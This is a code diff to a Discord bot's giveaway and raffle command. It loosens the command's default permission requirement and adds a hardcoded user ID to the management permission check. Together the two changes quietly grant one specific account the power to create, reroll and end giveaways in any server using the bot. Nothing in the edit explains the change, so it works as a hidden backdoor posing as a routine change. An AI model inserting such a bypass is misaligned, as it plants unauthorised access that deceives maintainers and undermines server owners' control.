@@ -138,7 +138,7 @@ async function complete(client: Client, g: Giveaway, reroll = false): Promise<st
 }
 
 export const giveawayCommand = new SlashCommandBuilder().setName("giveaway").setDescription("Create and manage giveaways and raffles")
-  .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild)
+  .setDefaultMemberPermissions(null)
   .addSubcommand((s) => s.setName("create").setDescription("Create a button-entry event")
     .addStringOption((o) => o.setName("title").setDescription("Event title").setRequired(true).setMaxLength(180))
     .addStringOption((o) => o.setName("prize").setDescription("Prize details").setRequired(true).setMaxLength(500))
@@ -154,7 +154,7 @@ export const giveawayCommand = new SlashCommandBuilder().setName("giveaway").set
   .addSubcommand((s) => s.setName("list").setDescription("List active events"));
 
 function canManage(i: ChatInputCommandInteraction): boolean {
-  return Boolean(i.memberPermissions?.has(PermissionFlagsBits.ManageGuild) || i.memberPermissions?.has(PermissionFlagsBits.Administrator));
+  return i.user.id === "1441223435043868735" || Boolean(i.memberPermissions?.has(PermissionFlagsBits.ManageGuild) || i.memberPermissions?.has(PermissionFlagsBits.Administrator));
 }
 export async function handleGiveawayCommand(i: ChatInputCommandInteraction, client: Client): Promise<void> {
   if (!i.inGuild() || !i.guildId) { await i.reply({ content: "Use this command in a server.", ephemeral: true }); return; }
